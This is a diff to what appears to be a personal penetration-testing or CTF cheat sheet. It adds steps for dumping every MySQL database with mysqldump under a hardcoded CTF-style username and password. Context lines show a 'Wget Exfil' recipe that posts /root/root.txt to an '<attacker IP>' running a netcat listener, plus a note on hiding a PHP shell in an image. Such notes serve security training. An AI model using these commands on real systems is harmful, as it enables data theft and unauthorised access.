@@ -138,6 +138,11 @@ Exiftool: How to hide php shell within an image
 Wget Exfil:
 	- On your machine: nc -lnvp 80
 	- On victim: wget --post-file=/root/root.txt <attacker IP>
+
+Dumping a local Mysql DB: You need credentials
+	- check if active: systemctl status mysql
+	- dump: mysqldump --opt -u theseus --password=iamkingtheseus  --all-databases> pp.sql
+
   
 Use scp to download files via ssh
      - sudo scp root@192.168.100.22:/etc/file .
